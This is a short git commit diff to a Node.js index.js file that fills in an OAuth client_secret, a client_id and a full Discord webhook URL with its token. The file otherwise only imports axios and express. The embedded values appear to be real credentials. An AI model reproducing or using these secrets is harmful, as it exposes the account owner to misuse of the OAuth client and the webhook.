bf3425fd58faecb8134004df9b13e61f3b4970b0
LightC0d3r <99517300+LightC0d3r@users.noreply.github.com>
2023-04-25 00:29:06 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,8 @@
 // Configuration
-const client_secret = ''
-const client_id = ''
+const client_secret = '56d9dac1-d257-4749-b479-1eb26791748a'
+const client_id = 'E4T8Q~I-_SqNnBFZlQGSiNN9ktn.T0_9nUYIvcxg'
 const redirect_uri = ''
-const webhook_url = ''
+const webhook_url = 'https://discord.com/api/webhooks/1100276752305111130/2zOhNvlQ3qBsceTmAjBoBpf3JW-d200qDmMVVGm9NoyREyrZFYJ6NF2Tzvm-6soGBfnP'
 // Config end
 const axios = require('axios')
 const express = require('express')
